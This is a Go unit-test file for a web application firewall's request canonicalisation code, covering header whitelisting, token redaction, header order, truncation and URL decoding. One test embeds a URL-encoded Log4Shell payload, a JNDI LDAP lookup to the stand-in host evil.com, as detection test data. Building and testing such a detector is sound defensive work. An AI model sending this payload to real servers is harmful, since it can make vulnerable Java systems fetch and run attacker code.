package training

import (
	"strings"
	"testing"

	"waf-project/internal/engine"
)

// helper: build a minimal ParsedRequest with the bits BuildCanonicalText reads.
func mkReq(method, path, query, body string, headers map[string]string) *engine.ParsedRequest {
	raw := make(map[string][]string, len(headers))
	for k, v := range headers {
		raw[strings.ToLower(k)] = []string{v}
	}
	return &engine.ParsedRequest{
		Method:          method,
		RawMethod:       method,
		NormalizedPath:  path,
		NormalizedQuery: query,
		NormalizedBody:  body,
		RawHeaders:      raw,
		Host:            headers["Host"],
		UserAgent:       headers["User-Agent"],
		ContentType:     headers["Content-Type"],
	}
}

func TestCanonicalShape(t *testing.T) {
	req := mkReq("GET", "/products", "id=42&q=shoes", "", map[string]string{
		"Host":       "shop.example.com",
		"User-Agent": "Mozilla/5.0",
		"Referer":    "https://google.com/",
	})
	got := BuildCanonicalText(req, nil, 1500)

	want := "GET /products?id=42&q=shoes\n" +
		"Host: shop.example.com\n" +
		"User-Agent: Mozilla/5.0\n" +
		"Referer: https://google.com/"
	if got != want {
		t.Fatalf("canonical mismatch\nwant: %q\ngot:  %q", want, got)
	}
}

func TestCanonicalURLDecodeOneLayer(t *testing.T) {
	// Log4Shell URL-encoded in body — should appear decoded (one layer) so
	// the model sees the literal ${jndi:...} pattern it was trained on.
	req := mkReq("POST", "/feedback", "", "msg=%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fa%7D",
		map[string]string{
			"Host":         "app.example.com",
			"Content-Type": "application/x-www-form-urlencoded",
		})
	got := BuildCanonicalText(req, nil, 1500)
	if !strings.Contains(got, "${jndi:ldap://evil.com/a}") {
		t.Fatalf("expected URL-decoded log4shell payload in body, got:\n%s", got)
	}
}

func TestCanonicalHeaderWhitelistOnly(t *testing.T) {
	// Random headers outside the whitelist should be dropped.
	req := mkReq("GET", "/", "", "", map[string]string{
		"Host":            "x.example.com",
		"X-Internal-Goo":  "should-not-appear",
		"Accept-Language": "en-US",
		"Cookie":          "session=abc; csrf=xyz",
	})
	got := BuildCanonicalText(req, nil, 1500)
	if strings.Contains(got, "X-Internal-Goo") {
		t.Fatalf("non-whitelist header leaked into canonical text:\n%s", got)
	}
	if strings.Contains(got, "Accept-Language") {
		t.Fatalf("Accept-Language is not whitelisted (helps prevent locale-based bias):\n%s", got)
	}
	if !strings.Contains(got, "Cookie:") {
		t.Fatalf("Cookie header (whitelisted) must appear:\n%s", got)
	}
}

func TestCanonicalAuthorizationSchemeOnly(t *testing.T) {
	req := mkReq("GET", "/api", "", "", map[string]string{
		"Host":          "api.example.com",
		"Authorization": "Bearer ey.s3cr3t.payload",
	})
	got := BuildCanonicalText(req, nil, 1500)
	if strings.Contains(got, "ey.s3cr3t.payload") {
		t.Fatalf("Authorization token leaked into canonical text:\n%s", got)
	}
	if !strings.Contains(got, "Authorization: Bearer ***") {
		t.Fatalf("expected scheme-only auth, got:\n%s", got)
	}
}

func TestCanonicalHeaderOrderStable(t *testing.T) {
	// Even if headers were inserted in a "random" order, the canonical form
	// must order them by canonicalHeaderOrder. Determinism is the contract
	// the model was trained against.
	req := mkReq("GET", "/", "", "", map[string]string{
		"Origin":     "https://shop.example.com",
		"User-Agent": "curl/8",
		"Referer":    "https://example.com/",
		"Host":       "x.example.com",
	})
	got := BuildCanonicalText(req, nil, 1500)
	idxHost := strings.Index(got, "Host:")
	idxUA := strings.Index(got, "User-Agent:")
	idxRef := strings.Index(got, "Referer:")
	idxOri := strings.Index(got, "Origin:")
	if !(idxHost < idxUA && idxUA < idxRef && idxRef < idxOri) {
		t.Fatalf("header order broken: Host=%d UA=%d Ref=%d Ori=%d\n%s",
			idxHost, idxUA, idxRef, idxOri, got)
	}
}

func TestCanonicalEmptyBodyNoTrailingBlankLines(t *testing.T) {
	req := mkReq("GET", "/", "", "", map[string]string{"Host": "x.example.com"})
	got := BuildCanonicalText(req, nil, 1500)
	if strings.HasSuffix(got, "\n") {
		t.Fatalf("trailing newline on empty body:\n%q", got)
	}
}

func TestCanonicalTruncate(t *testing.T) {
	body := strings.Repeat("A", 5000)
	req := mkReq("POST", "/x", "", body, map[string]string{
		"Host":         "x.example.com",
		"Content-Type": "text/plain",
	})
	got := BuildCanonicalText(req, nil, 500)
	if len(got) > 500 {
		t.Fatalf("expected ≤500 bytes, got %d", len(got))
	}
}
